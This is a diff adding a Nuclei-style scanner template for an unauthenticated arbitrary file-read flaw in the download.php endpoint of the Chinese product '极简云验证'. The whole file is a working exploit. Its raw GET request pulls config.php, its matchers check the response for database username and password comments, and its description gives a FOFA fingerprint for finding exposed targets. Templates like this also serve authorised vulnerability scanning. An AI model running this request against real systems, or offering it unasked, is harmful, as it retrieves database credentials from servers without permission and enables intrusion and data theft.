@@ -1,0 +1,30 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - //数据库用户名
+            - //数据库密码
+            - //数据库名
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /download.php?file=20b6cb088a8d5c444074&filename=config.php HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
+id: jijianyun-download_php-File-reading
+info:
+    author: Superhero
+    description: |-
+        fofa: "../assets/img/bg/logo_white.png"
+        极简云验证 download.php 接口处存在文件读取漏洞，未经身份验证的攻击者可以利用此漏洞读取系统内部配置文件，数据库账号密码等敏感信息，使系统处于极不安全的状态。
+    name: 极简云验证 download.php 任意文件读取漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247488181&idx=1&sn=3bb53898511573714dc7a0ec8208c649&chksm=c267a786f5102e901c3ca974ff99c0d9b27b94fe5f33ee3eb07dfacc5c9b201dfd76730ecce2&token=350950895&lang=zh_CN#rd
+    severity: high
+    tags:
+        - File reading
